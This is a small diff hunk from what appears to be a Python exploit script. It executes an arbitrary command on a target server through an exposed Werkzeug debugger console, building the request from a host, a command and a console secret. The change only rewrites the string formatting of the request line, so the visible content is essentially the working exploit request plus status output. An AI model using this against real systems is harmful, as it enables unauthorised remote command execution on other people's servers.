@@ -32,7 +32,7 @@ print(f"[+] Script will try executing {sys.argv[2]} on {sys.argv[1]}")
 
 raw_input("Press any key to execute")
 
-response = requests.get("http://%s/console?__debugger__=yes&cmd=%s&frm=0&s=%s" % (sys.argv[1],str(cmd),secret))
+response = requests.get(f"http://{sys.argv[1]}/console?__debugger__=yes&cmd={str(cmd)}&frm=0&s={secret}")
 
 print("[+] response from server")
 print(f"status code: {str(response.status_code)}")
